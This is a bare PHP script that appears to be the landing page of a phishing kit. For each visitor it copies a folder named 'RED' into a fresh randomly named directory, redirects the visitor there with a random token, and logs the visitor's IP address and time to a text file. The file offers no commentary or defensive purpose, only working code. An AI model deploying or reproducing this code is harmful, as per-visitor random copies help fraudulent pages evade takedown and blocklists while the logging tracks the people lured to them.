<?php
// if you wan't to force HTTPS just remove the ( // ) bellow - *Your hosting must support Green SSL
//if(!isset($_SERVER["HTTPS"]) || $_SERVER["HTTPS"] != "on") { header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"], true, 301); exit; }
#------------------------
#For Bot
$randomString = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 1) . substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 10);
#------------------------
$DIR=md5 (rand(0,8000000000));
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            }
            else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}
$home="RED";
recurse_copy( $home, $DIR );
header("location:$DIR?jackswing=$randomString");
#----------------------++
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
$TIME = date("d-m-Y H:i:s");
fwrite($file,"[+] ".$ip." @ ".$TIME."\n");
?>                              